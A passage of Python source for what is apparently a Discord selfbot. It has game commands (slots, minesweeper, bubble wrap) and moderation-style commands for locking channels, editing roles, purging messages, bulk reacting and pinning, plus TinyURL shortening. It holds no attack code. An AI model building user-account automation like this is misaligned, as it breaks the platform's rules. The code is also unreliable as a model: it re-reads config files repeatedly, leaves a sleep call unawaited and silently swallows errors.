        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)




    @React.command(usage="slots", description="Gamble with a slot machine")
    async def slots(ctx):
        emojis = "üçïüçüüçîüç´üç¨ü•§üçíüçâ"
        a = random.choice(emojis)
        b = random.choice(emojis)
        c = random.choice(emojis)
        slotmachine = f"**[ {a} {b} {c} ]\n**"
        if (a == b == c):
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Slot Machine', description=f"{slotmachine} All match, you win!",timestamp=embed_timestamp())
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await embed_or_codeblock(ctx, embed)


        elif (a == b) or (a == c) or (b == c):
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Slot Machine', description=f"{slotmachine} two in a row, you win!",timestamp=embed_timestamp())
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Slot Machine', description=f"{slotmachine} No matches, you lost",timestamp=embed_timestamp())
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await embed_or_codeblock(ctx, embed)


            
    @React.command(usage="minesweeper", description="Minesweeper")
    async def minesweeper(ctx):
        try:
            columns = None
            rows = None
            bombs = None
            if columns is None or rows is None and bombs is None:
                if columns is not None or rows is not None or bombs is not None:
                    await ctx.send(errortxt)
                    return
                else:
                    columns = random.randint(4,13)
                    rows = random.randint(4,13)
                    bombs = columns * rows - 1
                    bombs = bombs / 2.5
                    bombs = round(random.randint(5, round(bombs)))
                try:
                    columns = int(columns)
                    rows = int(rows)
                    bombs = int(bombs)
                except ValueError:
                    await ctx.send(errortxt)
                    return
                if columns > 13 or rows > 13:
                    await ctx.send('The limit for the columns and rows are 13 due to discord limits.')
                    return
                if columns < 1 or rows < 1 or bombs < 1:
                    await ctx.send('The provided numbers cannot be zero or negative.')
                    return
                if bombs + 1 > columns * rows:
                    await ctx.send('You have more bombs than spaces on the grid or you attempted to make all of the spaces bombs!')
                    return
                
                grid = [[0 for num in range (columns)] for num in range(rows)]

                loop_count = 0
                while loop_count < bombs:
                    x = random.randint(0, columns - 1)
                    y = random.randint(0, rows - 1)
                    if grid[y][x] == 0:
                        grid[y][x] = 'B'
                        loop_count = loop_count + 1
                    if grid[y][x] == 'B':
                        pass

                pos_x = 0
                pos_y = 0
                while pos_x * pos_y < columns * rows and pos_y < rows:
                    adj_sum = 0
                    for (adj_y, adj_x) in [(0,1),(0,-1),(1,0),(-1,0),(1,1),(-1,1),(1,-1),(-1,-1)]:
                        try:
                            if grid[adj_y + pos_y][adj_x + pos_x] == 'B' and adj_y + pos_y > -1 and adj_x + pos_x > -1:
                                adj_sum = adj_sum + 1
                        except:
                            pass
                    if grid[pos_y][pos_x] != 'B':
                        grid[pos_y][pos_x] = adj_sum
                    if pos_x == columns - 1:
                        pos_x = 0
                        pos_y = pos_y + 1
                    else:
                        pos_x = pos_x + 1

                string_builder = []
                for the_rows in grid:
                    string_builder.append(''.join(map(str, the_rows)))
                string_builder = '\n'.join(string_builder)
                string_builder = string_builder.replace('0', '||:white_large_square:||')
                string_builder = string_builder.replace('1', '||:one:||')
                string_builder = string_builder.replace('2', '||:two:||')
                string_builder = string_builder.replace('3', '||:three:||')
                string_builder = string_builder.replace('4', '||:four:||')
                string_builder = string_builder.replace('5', '||:five:||')
                string_builder = string_builder.replace('6', '||:six:||')
                string_builder = string_builder.replace('7', '||:seven:||')
                string_builder = string_builder.replace('8', '||:eight:||')
                final = string_builder.replace('B', '||:bomb:||')

                percentage = columns * rows
                percentage = bombs / percentage
                percentage = 100 * percentage
                percentage = round(percentage, 2)

                embed = discord.Embed(title='Minesweeper', description=f'\U0000FEFF{final}', color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
                embed.add_field(name='Columns:', value=columns, inline=True)
                embed.add_field(name='Rows:', value=rows, inline=True)
                embed.add_field(name='Total Spaces:', value=columns * rows, inline=True)
                embed.add_field(name='\U0001F4A3 Count:', value=bombs, inline=True)
                embed.add_field(name='\U0001F4A3 Percentage:', value=f'{percentage}%', inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                await ctx.send(embed=embed)
        except Exception as e:
            pass
            
    @React.command(usage="bubblewrap", description="Bubble Wrap pop")
    async def bubblewrap(ctx):
        columns = None
        rows = None
        bombs = None
        if columns is None or rows is None and bombs is None:
            if columns is not None or rows is not None or bombs is not None:
                await ctx.send(errortxt)
                return
            else:
                columns = random.randint(4,10)
                rows = random.randint(4,10)
                bombs = columns * rows - 1
                bombs = bombs / 2.5
                bombs = round(random.randint(5, round(bombs)))
            try:
                columns = int(columns)
                rows = int(rows)
                bombs = int(bombs)
            except ValueError:
                await ctx.send(errortxt)
                return
            if columns > 10 or rows > 10:
                await ctx.send('The limit for the columns and rows are 13 due to discord limits.')
                return
            if columns < 1 or rows < 1 or bombs < 1:
                await ctx.send('The provided numbers cannot be zero or negative.')
                return
            if bombs + 1 > columns * rows:
                await ctx.send('You have more bombs than spaces on the grid or you attempted to make all of the spaces bombs!')
                return
            
            grid = [[0 for num in range (columns)] for num in range(rows)]

            loop_count = 0
            while loop_count < bombs:
                x = random.randint(0, columns - 1)
                y = random.randint(0, rows - 1)
                if grid[y][x] == 0:
                    grid[y][x] = 'B'
                    loop_count = loop_count + 1
                if grid[y][x] == 'B':
                    pass

            pos_x = 0
            pos_y = 0
            while pos_x * pos_y < columns * rows and pos_y < rows:
                adj_sum = 0
                for (adj_y, adj_x) in [(0,1),(0,-1),(1,0),(-1,0),(1,1),(-1,1),(1,-1),(-1,-1)]:
                    try:
                        if grid[adj_y + pos_y][adj_x + pos_x] == 'B' and adj_y + pos_y > -1 and adj_x + pos_x > -1:
                            adj_sum = adj_sum + 1
                    except:
                        pass
                if grid[pos_y][pos_x] != 'B':
                    grid[pos_y][pos_x] = adj_sum
                if pos_x == columns - 1:
                    pos_x = 0
                    pos_y = pos_y + 1
                else:
                    pos_x = pos_x + 1

            string_builder = []
            for the_rows in grid:
                string_builder.append(''.join(map(str, the_rows)))
            string_builder = '\n'.join(string_builder)
            string_builder = string_builder.replace('0', '||:blue_circle:||')
            string_builder = string_builder.replace('1', '||:blue_circle:||')
            string_builder = string_builder.replace('2', '||:blue_circle:||')
            string_builder = string_builder.replace('3', '||:blue_circle:||')
            string_builder = string_builder.replace('4', '||:blue_circle:||')
            string_builder = string_builder.replace('5', '||:blue_circle:||')
            string_builder = string_builder.replace('6', '||:blue_circle:||')
            string_builder = string_builder.replace('7', '||:blue_circle:||')
            string_builder = string_builder.replace('8', '||:blue_circle:||')
            final = string_builder.replace('B', '||:blue_circle:||')

            percentage = columns * rows
            percentage = bombs / percentage
            percentage = 100 * percentage
            percentage = round(percentage, 2)

            embed = discord.Embed(title='Bubble Wrap', description=f'\U0000FEFF{final}', color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
            embed.add_field(name='Columns:', value=columns, inline=True)
            embed.add_field(name='Rows:', value=rows, inline=True)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await ctx.send(embed=embed)


    @React.command(usage="lockchannel <Channel>", description="Locks a channel")
    async def lockchannel(ctx, channel: discord.channel.TextChannel=None):
        try:
            if channel is None:
                channel = ctx.channel
            if channel:
                if channel in ctx.guild.text_channels:
                    perms = channel.overwrites_for(ctx.guild.default_role)
                    perms.send_messages = False
                    await channel.set_permissions(ctx.guild.default_role, overwrite=perms)
                    embed = discord.Embed(title='Channel Lock', color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
                    embed.add_field(name='__üîê Locked Channel__', value=f"{channel.mention}", inline=True)
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    await ctx.send(embed=embed)
        except Exception:
            pass

    @React.command(usage="unlockchannel <Channel>", description="Unocks a channel")
    async def unlockchannel(ctx, channel: discord.channel.TextChannel=None):
        try:
            if channel is None:
                channel = ctx.channel
            if channel:
                if channel in ctx.guild.text_channels:
                    perms = channel.overwrites_for(ctx.guild.default_role)
                    perms.send_messages = True
                    await channel.set_permissions(ctx.guild.default_role, overwrite=perms)
                    embed = discord.Embed(title='Channel Lock', color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
                    embed.add_field(name='__üîê Unlocked Channel__', value=f"{channel.mention}", inline=True)
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    await ctx.send(embed=embed)
        except Exception:
            pass

    @React.command(usage="addrole <Member> <Role>", description="Gives a role to a member")
    async def addrole(ctx, member: discord.Member, role: discord.Role):
        try:
            if role not in member.roles:
                roles = member.roles
                roles.append(role)
                asyncio.sleep(0.5)
                await member.edit(roles=roles)

            embed = discord.Embed(title='Member Roles', color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
            embed.add_field(name='__üßë Member__', value=f"{member.mention}", inline=True)
            embed.add_field(name='__üåà Added Role__', value=f"{role.mention}", inline=False)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await ctx.send(embed=embed)
        except Exception:
            pass

    @React.command(usage="removerole <Member> <Role>", description="Removes a role from a member")
    async def removerole(ctx, member: discord.Member, role: discord.Role):
        try:
            if role in member.roles:
                roles = member.roles
                roles.remove(role)
                asyncio.sleep(0.5)
                await member.edit(roles=roles)

            embed = discord.Embed(title='Member Roles', color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
            embed.add_field(name='__üßë Member__', value=f"{member.mention}", inline=True)
            embed.add_field(name='__üåà Removed Role__', value=f"{role.mention}", inline=False)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await ctx.send(embed=embed)
        except Exception:
            pass

    @React.command(usage="spurge <Amount>", description="Purges a specified amount of your own messages")
    async def spurge(ctx, amount: int):
        try:
            await ctx.channel.purge(limit=amount, before=ctx.message, check=lambda e: e.author == React.user)
        except Exception:
            pass

    @React.command(usage="purge <Amount>", description="Purges a specified amount of messages")
    async def purge(ctx, amount: int):
        # try:
        #     await ctx.channel.purge(limit=amount, before=ctx.message, check=None)
        # except Exception:
        #     pass

        async for message in ctx.channel.history(limit = amount + 1):
            try:
                await message.delete()
            except Exception:
                pass
            
    @React.command(usage="bulkreact <Amount> <Emoji>", description="Reacts to an amount of messages above")
    async def bulkreact(ctx, amount: int, emoji: str):
        async for message in ctx.message.channel.history(limit=amount + 1):
            try:
                await message.add_reaction(emoji)
            except:
                pass

    @React.command(usage="bulkpin <Amount>", description="Pins the amount of messages above")
    async def bulkpin(ctx, amount: int):
        async for message in ctx.message.channel.history(limit=amount + 1):
            try:
                await message.pin()
            except:
                pass
            
    # YTDL_OPTS = {
    #     "default_search": "ytsearch",
    #     "format": "bestaudio/best",
    #     "quiet": True,
    #     "extract_flat": "in_playlist"
    # }
            
    # class Video:
    #     def __init__(self, url_or_search, requested_by):
    #         with ytdl.YoutubeDL(YTDL_OPTS) as ydl:
    #             video = self._get_info(url_or_search)
    #             video_format = video["formats"][0]
    #             self.stream_url = video_format["url"]
    #             self.video_url = video["webpage_url"]
    #             self.title = video["title"]
    #             self.uploader = video["uploader"] if "uploader" in video else ""
    #             self.thumbnail = video[
    #                 "thumbnail"] if "thumbnail" in video else None
    #             self.requested_by = requested_by

    #     def _get_info(self, video_url):
    #         with ytdl.YoutubeDL(YTDL_OPTS) as ydl:
    #             info = ydl.extract_info(video_url, download=False)
    #             video = None
    #             if "_type" in info and info["_type"] == "playlist":
    #                 return self._get_info(
    #                     info["entries"][0]["url"])
    #             else:
    #                 video = info
    #             return video

    #     def get_embed(self):
    #         embed = discord.Embed(
    #             title=self.title, url=self.video_url, color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
    #         embed.set_footer(
    #             text=embed_footer,
    #             icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #         if self.thumbnail:
    #             embed.set_thumbnail(url=self.thumbnail)
    #         return embed
        
    # def _play_song(client, song):
    #     source = discord.PCMVolumeTransformer(
    #         discord.FFmpegPCMAudio(song.stream_url), volume=1)
    #     client.play(source)
            
    # @React.command()
    # async def play(ctx, *, url):
    #     try:
    #         client = ctx.guild.voice_client
                
    #         if client and client.channel:
    #             try:
    #                 video = Video(url, ctx.author)
    #             except youtube_dl.DownloadError as e:
    #                 await ctx.send(
    #                     "There was an error downloading your video, sorry.")
    #                 return
    #             message = await ctx.send(embed=video.get_embed())
    #         else:
    #             if ctx.author.voice is not None and ctx.author.voice.channel is not None:
    #                 channel = ctx.author.voice.channel
    #                 try:
    #                     video = Video(url, ctx.author)
    #                 except youtube_dl.DownloadError as e:
    #                     await ctx.send(
    #                         "There was an error downloading your video, sorry.")
    #                     return
    #                 client = await channel.connect()
    #                 _play_song(client, video)
    #                 message = await embed_or_codeblock(ctx, video.get_embed())


    #             else:
    #                 raise commands.CommandError("You need to be in a voice channel to do that.")
    #     except Exception:
    #         pass
            
    def make_tiny(url):
        try:
            request_url = requests.post(f'http://tinyurl.com/api-create.php?url={urllib.parse.quote(url)}')
            return request_url.content.decode('utf-8 ')
        except Exception:
            pass
        
    # @React.command()
    # async def gui(ctx):
    #     if sys.platform == "win32":
    #         try:
    #             import imgui
    #             from imgui.integrations.pygame import PygameRenderer
            

    #             # # initilize imgui context (see documentation)
    #             imgui.create_context()
    #             imgui.get_io().display_size = 100, 100
    #             imgui.get_io().fonts.get_tex_data_as_rgba32()

    #             # start new frame context
    #             imgui.new_frame()

    #             # open new window context
    #             imgui.begin("Your first window!", True)

    #             # draw text label inside of current window
    #             imgui.text("Hello world!")

    #             # close current window context
    #             imgui.end()

    #             # pass all drawing comands to the rendering pipeline
    #             # and close frame context
                
    #             pygame.init()
    #             # pygame.DOUBLEBUF | pygame.OPENGL
    #             pygame.display.set_mode((800, 600), pygame.DOUBLEBUF | pygame.OPENGL)
    #             renderer = PygameRenderer()
    #             done = False
    #             while not done:
    #                 for event in pygame.event.get():
    #                     if event.type == pygame.QUIT:
    #                         done = True
    #                     renderer.process_event(event)
    #                     imgui.render()
    #                     imgui.end_frame()
    #                 pygame.display.flip()
    #             pygame.quit()
    #         except Exception:
    #             pass
    #     else:
    #         print('This only works on Windows!')

    @React.command(usage="tinyurl <URL>", description="Converts a URL to a TinyURL")
    async def tinyurl(ctx, url: str):
        await ctx.send(make_tiny(url))
    
    # @React.command()
    # async def loadscripts(ctx):
    #     try:
    #         for filename in os.listdir('Scripts'):
    #             if filename.endswith('.py'):
    #                 bot.load_extension(f'Scripts.{filename[:-3]}')
    #                 print(fg.white + f'[{ fg.purple3 + time.strftime("%H:%M:%S", time.gmtime(time.time())) + fg.white}] Loaded Script | ' + fg.purple3 + str(filename))
    #     except Exception:
    #         pass        
            
    @React.command(usage="searchcmd <Content>", description="Searches for a command")
    async def searchcmd(ctx, content = None):
        found_cmds = []
        count = 0
        try:
            commands = open("features.txt",'r').read()
            cmd_dict = {}

            for i in commands.split("\n"):
                i = i.replace("\r", "").split(" | ")
                if len(i) == 1:
                    continue
                else:
                    #i[0] = re.findall(r"[a-zA-Z0-9]+\s", i[0])[0].replace(" ", "")
                    cmd_dict[i[0]] = i[1]

            for i, j in cmd_dict.items():
                if content.lower() in j.lower() or content.lower() in i.lower():
                    found_cmds.append(f"**`{json.load(open('config.json', encoding='utf-8'))['prefix']}`{i}** ¬ª {j}")
                    count += 1

            # if os.path.exists(f'./Languages/{json.load(open("""config.json""", encoding="""utf-8"""))["""language"""]}.json'):
            #     with open(f'./Languages/{json.load(open("""config.json""", encoding="""utf-8"""))["""language"""]}.json', "r") as jsonFile:
            #         data = json.load(jsonFile)
            # else:
            #     for key, value in data.items():
            #         command_description = value['Description']
            #         command_usage = value['Usage']

            #         if content.lower() in command_usage.lower() or content.lower() in command_description:
            #             try:
            #                 found_cmds.append(f"**`{json.load(open('config.json', encoding='utf-8'))['prefix']}`{command_usage}** ¬ª {command_description}")
            #                 count += 1
            #             except:
            #                 pass
            
            cmds = ''
            if count == 0:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Command Search', description=f'Found {count} commands matching your query for "{content}".',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                embed.add_field(name='__üëæ Commands__', value='No commands found.')
                await embed_or_codeblock(ctx, embed)


            elif count >= 10:
                for i, cmd in enumerate(found_cmds):
                    if i <= 9:
                        cmds += '\n'
                        cmds += f'{cmd}'
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Command Search', description=f'Found {count} commands matching your query for "{content}". Showing first 10.',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                embed.add_field(name='__üëæ Commands__', value=cmds)
                await embed_or_codeblock(ctx, embed)


            else:
                for i, cmd in enumerate(found_cmds):
                    if i:
                        cmds += '\n'
                    cmds += f'{cmd}'
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Command Search', description=f'Found {count} commands matching your query for "{content}".',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
